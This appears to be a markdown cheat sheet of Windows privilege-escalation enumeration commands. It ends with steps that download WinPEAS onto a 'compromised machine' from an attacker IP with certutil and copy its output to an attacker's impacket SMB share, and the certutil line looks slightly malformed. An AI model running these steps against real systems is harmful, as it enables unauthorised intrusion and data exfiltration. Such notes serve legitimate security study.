

```markdown
# Windows Privilege Escalation (PrivEsc)

---

## Enumeration

---

### Manual Enumeration

#### Basic User Information
```bash
whoami
net user            # List all available users
net user ravi        # Get detailed information about a specific user
net localgroup       # Check all local groups on this machine
net localgroup Users # Check members of the 'Users' group
net localgroup Administrators # Check members of the 'Administrators' group
```

---

### System Information
```bash
systeminfo                       # General system information
wmic qfe get Caption, Description, HotFixID, InstallDate   # Installed patches and updates
wmic os get *                     # Detailed OS version info
# Alternative:
wmic os get Caption, Name, BuildNumber
```

---

### Process and Services Enumeration
```bash
tasklist /v      # List processes with detailed info
tasklist /svc    # List processes mapped to services
```

---

### Network Information
```bash
ipconfig /all                       # Full network configuration
route print                         # Routing table
netstat -ano                        # Active connections with process IDs
netsh advfirewall show currentprofile  # Current firewall profile
# Check firewall rules (replace <rule-name> with actual rule):
netsh advfirewall firewall show rule name="<rule-name>"
```

---

### Scheduled Tasks Enumeration
```bash
schtasks /query /v /fo LIST      # List all scheduled tasks with details
powershell Get-ScheduledTask     # Using PowerShell to list scheduled tasks
```

---

### Installed Applications
```bash
wmic product get *       # Full list of installed products
wmic product get Caption, Description, InstallLocation, Name  # Filtered application information
```

---

### Permission Checks (Using Sysinternals AccessChk)
```bash
accesschk.exe -uws "Users" "C:\Program Files" --accepteula
```

# Windows Integrity Levels and Privilege Automation

---

## Windows Integrity Levels

### Check Integrity Level - Files and Binaries

```bash
icacls example.txt
icacls cmd.exe
```

---

### Check Integrity Level - Current User

```bash
whoami /groups
```

---

## Automation - Windows Privilege Enumeration (Awesome Script)

### Recommended Tool: WinPEAS

---

### Step 1 - Download WinPEAS to Compromised Machine

```bash
certutil -f urlcache http://10.10.x.x/winpease.exe
```

---

### Step 2 - Run WinPEAS and Save Output

```bash
winpease.exe > win.txt
```

---

### Step 3 - Set up SMB Share on Attacker Machine (Kali)

```bash
impacket-smbserver share .
```

---

### Step 4 - Exfiltrate Output to Attacker Machine via SMB

```bash
copy win.txt \\attacker_machine_ip\share\win.txt
```

---

